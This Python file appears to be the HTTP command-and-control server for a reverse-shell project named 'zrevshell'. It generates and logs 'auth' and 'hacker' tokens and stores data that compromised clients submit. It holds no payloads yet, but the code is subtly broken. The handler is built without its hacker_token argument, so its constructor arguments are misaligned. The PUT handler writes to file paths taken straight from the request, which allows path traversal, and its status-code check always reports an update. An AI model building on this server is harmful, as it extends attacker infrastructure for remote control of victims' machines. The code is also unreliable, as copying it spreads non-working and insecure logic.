from http.server import HTTPServer, BaseHTTPRequestHandler
from http import HTTPStatus
from functools import partial
from datetime import datetime
from pathlib import Path
from reverse_shell import __version__, __app_name__
from reverse_shell.server import ErrorCodes
import argparse
import reverse_shell.utils as ut
import json
import uuid
import base64
import sys


class ZrevshellServer(BaseHTTPRequestHandler):
    def __init__(self, auth_token: str, hacker_token: str,  *args, **kwargs):
        # auth_token is a base64 message i.e it is a string that has been decoded from a base64 byte using ascii.
        self.auth_token = auth_token
        self.hacker_token = hacker_token

        super().__init__(*args, **kwargs)

    def is_authenticated(self):
        if self.headers.get("Authorization") == f"Basic {self.auth_token}":
            return True
        else:
            self.send_error(HTTPStatus.UNAUTHORIZED)
            return False

    def do_GET(self):
        if self.is_authenticated():
            self.send_response(HTTPStatus.OK)
            self.send_header("Content-Type", "text/html")
            if length := self.headers.get("content-length"):
                content = self.rfile.read(length)
                print(content)
            self.end_headers()

            self.wfile.write(bytes("<html><head><title>We are running a server</title></head> <body> <h1> Hello World </h1> </body></html>", "utf-8"))

    def do_PUT(self):
        if self.is_authenticated():
            if self.headers.get("content-type") == "application/json":
                if self.path != "/":
                    file_path = f".{self.path}.json"
                else:
                    self.send_error(HTTPStatus.BAD_REQUEST)
                    self.end_headers()
                    return
                with open(file_path) as file:
                    data = json.loads(file.read())
                    client_id = self.headers.get("client-id")
                    content_size = int(self.headers.get("content-length"))
                    # Create or modify the data
                    data[client_id] = json.loads(self.rfile.read(content_size))

                # Write the data back to the file
                with open(file_path, "w") as file:
                    file.write(json.dumps(data))

                # If the data exists then send the 200 status code but if it doesn't exist
                # then send the 201 status code
                if client_id in data:
                    self.send_response(HTTPStatus.OK)
                    self.end_headers()
                else:
                    self.send_response(HTTPStatus.CREATED)
                    self.end_headers()
            else:
                self.send_error(HTTPStatus.UNSUPPORTED_MEDIA_TYPE)
                self.end_headers()

# hacker_token + auth_token


def generate_token():
    random_uuid = uuid.uuid4()
    random_encoded_bytes = str(random_uuid).encode('ascii')
    base64_encoded_bytes = base64.b64encode(random_encoded_bytes)
    return base64_encoded_bytes.decode('ascii')


# def decode_token(token: str):
#     ascii_encoded_base64 = token.encode("ascii")
#     decoded_ascii = base64.b64decode(ascii_encoded_base64)
#     return decoded_ascii.decode("ascii")

def create_log_file(auth_token, hacker_token):
    current_time = str(datetime.now())
    current_time = current_time.replace(":", "-")
    current_time = current_time.replace(" ", "-")
    current_time = current_time.split(".")[0]

    # Create the path and stuff
    directory = Path("./logs/")
    directory.mkdir(parents=True, exist_ok=True)

    file_path = directory / f"{current_time}.json"

    with file_path.open("w") as log_file:
        data = {"auth_token": auth_token, "hacker_token": hacker_token}
        log_file.write(json.dumps(data))


def get_config():
    argument_parser = argparse.ArgumentParser(prog=f"{__app_name__} server", description="The server for the zrevshell project", formatter_class=argparse.ArgumentDefaultsHelpFormatter)

    argument_parser.add_argument("--from-log", type=Path, required=False, help="Server generated log file used to re-initiate the same session as the previous.", default=None)

    argument_parser.add_argument("-p", "--port", type=int, required=False, help="The port on which the server runs on.", default=80)

    argument_parser.add_argument("-i", "--ip", type=str, required=False, help="The ip where the server is hosted on.", default="0.0.0.0")

    argument_parser.add_argument("--version", "-v", action="version", version=f"{__app_name__} server v{__version__}")

    return argument_parser.parse_args()


def initialize_server(auth_token: str, hacker_token: str, host: str, port: int, should_create_log_file=True):
    # auth_token is a base64 message i.e it is a string that has been decoded from a base64 byte using ascii.

    # Create a log file with the hacker and auth token
    if should_create_log_file:
        create_log_file(auth_token, hacker_token)

    handler = partial(ZrevshellServer, auth_token)

    ut.log("info", f"Server is running on {host} port {port}...")
    server = HTTPServer((host, port), handler)
    ut.log("info", f"Generated authentication token -> {auth_token}")
    ut.log("info", f"Generated hacker's token -> {hacker_token}")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    print("Server has shutdown.")


def main():
    config = get_config()
    # Extract the auth_token and hacker_token from file
    # if the file exists else generate them
    if (path := config.from_log) is not None:
        file_path = Path(path)
        if not file_path.is_file():
            ut.log("error", f"The file `{path}` doesn't exist!")
            sys.exit(ErrorCodes.file_not_found)

        contents = file_path.read_text("utf-8")
        try:
            data = json.loads(contents)
            auth_token = data["auth_token"]
            hacker_token = data["hacker_token"]
        except json.JSONDecodeError:
            ut.log("error", f"File is not valid, Please use a valid server generated file.")
            sys.exit(ErrorCodes.incorrect_file_format)
        should_create_log_file = False

    else:
        auth_token = generate_token()
        hacker_token = generate_token()
        should_create_log_file = True

    initialize_server(auth_token, hacker_token, config.ip, config.port, should_create_log_file=should_create_log_file)


main()
